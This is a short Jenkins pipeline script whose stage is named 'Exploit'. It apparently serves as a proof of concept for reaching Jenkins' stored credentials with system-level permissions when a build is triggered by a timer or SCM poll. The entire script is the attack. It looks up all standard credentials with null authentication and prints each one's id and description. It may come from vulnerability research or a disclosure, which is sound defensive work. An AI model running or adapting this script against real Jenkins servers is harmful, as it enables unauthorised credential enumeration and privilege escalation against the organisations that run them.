pipeline {
    agent any
    stages {
        stage('Exploit') {
            steps {
                script {
                    echo "Trying to list credentials"
                    // This runs with ACL.SYSTEM2 when triggered by timer/SCM poll
                    def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
                        com.cloudbees.plugins.credentials.common.StandardCredentials.class,
                        Jenkins.instance,
                        null,  // Uses current authentication = ACL.SYSTEM2
                        null
                    )
                    creds.each { c ->
                        echo "Found credential: ${c.id} - ${c.description}"
                    }
                }
            }
        }
    }
}
